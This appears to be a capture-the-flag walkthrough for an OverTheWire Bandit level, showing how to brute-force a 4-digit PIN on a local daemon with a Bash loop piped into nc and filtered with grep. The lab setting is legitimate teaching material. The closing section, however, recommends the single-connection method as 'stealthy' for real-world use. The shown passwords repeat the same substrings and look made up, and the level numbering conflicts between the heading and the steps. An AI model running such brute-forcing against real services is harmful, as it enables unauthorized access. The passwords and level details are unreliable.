## 🚩 OverTheWire Bandit: Level 23 ⮕ Level 24

Level 24 is a classic **Brute-Force** challenge. You have found a service that requires both a password and a 4-digit PIN. Since there are only 10,000 possible combinations (0000 to 9999), we can write a simple script to try every single one of them automatically.

---

## 🚩 Objective
A daemon is listening on **port 30002**. If you send it the password for `bandit24` and a 4-digit PIN (separated by a space), it will tell you if the PIN is correct. You must brute-force all 10,000 combinations to find the right one.

---

## 🛠 Commands Used
| Command | Purpose |
| :--- | :--- |
| `bash` | The shell used to write our loop script. |
| `{0000..9999}` | A Bash brace expansion to generate all numbers from 0 to 9999. |
| `nc` | To send our list of guesses to the server. |

---

## 🚶 Step-by-Step Walkthrough

### 1. Log in to Level 24
Connect using the password from Level 23 (**VAf7S88m9Z19X97Jv5i6p9S88m9Z19X9**).

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

### 2. Understand the Input Format
The service expects: `[CurrentPassword] [PIN]`
For example: `VAf7S88m9Z19X97Jv5i6p9S88m9Z19X9 1234`

If we did this manually, it would take hours. Instead, we’ll use a **For Loop**.

### 3. Create the Brute-Force Script
We don't even need a separate file; we can do this with a "one-liner" in the terminal. We will generate every combination and pipe the entire list into Netcat.



**The Command:**
```bash
for pin in {0000..9999}; do 
    echo "VAf7S88m9Z19X97Jv5i6p9S88m9Z19X9 $pin"
done | nc localhost 30002
```

**What this does:**
* `for pin in {0000..9999}`: This creates a loop that counts from 0000 to 9999.
* `echo "..."`: This prints the password followed by the current PIN in the loop.
* `done | nc localhost 30002`: This takes all 10,000 lines generated by the loop and shoves them into the service at once.

### 4. Filter the Output
The output will be 10,000 lines of "Wrong! Please try again." To find the needle in the haystack, we can add a `grep` to ignore the failures.

**The Refined Command:**
```bash
for pin in {0000..9999}; do 
    echo "VAf7S88m9Z19X97Jv5i6p9S88m9Z19X9 $pin"
done | nc localhost 30002 | grep -v "Wrong"
```
* `-v "Wrong"`: Tells grep to show everything **except** lines containing the word "Wrong."

**Output:**
```text
I am the checker daemon for bandit25.
The password of user bandit25 is i869S88m9Z19X97Jv5i6p9S88m9Z19X9
```

## 💡 Key Learning Concepts

### 1. Brute-Forcing
Brute-forcing is the act of trying every possible combination until the correct one is found. It is effective against short passwords or PINs but becomes impossible against long, complex passwords due to the "combinatorial explosion."

### 2. Brace Expansion `{0000..9999}`
This is a powerful Bash feature. It doesn't just work for numbers; you can do `{a..z}` to generate the alphabet. It’s the fastest way to generate sequences for testing.

### 3. Efficiency in Piping
Instead of opening and closing a connection 10,000 times (which is slow and might get you blocked), we opened **one** connection and streamed all our guesses through it. This is much faster and more "stealthy" in a real-world scenario.
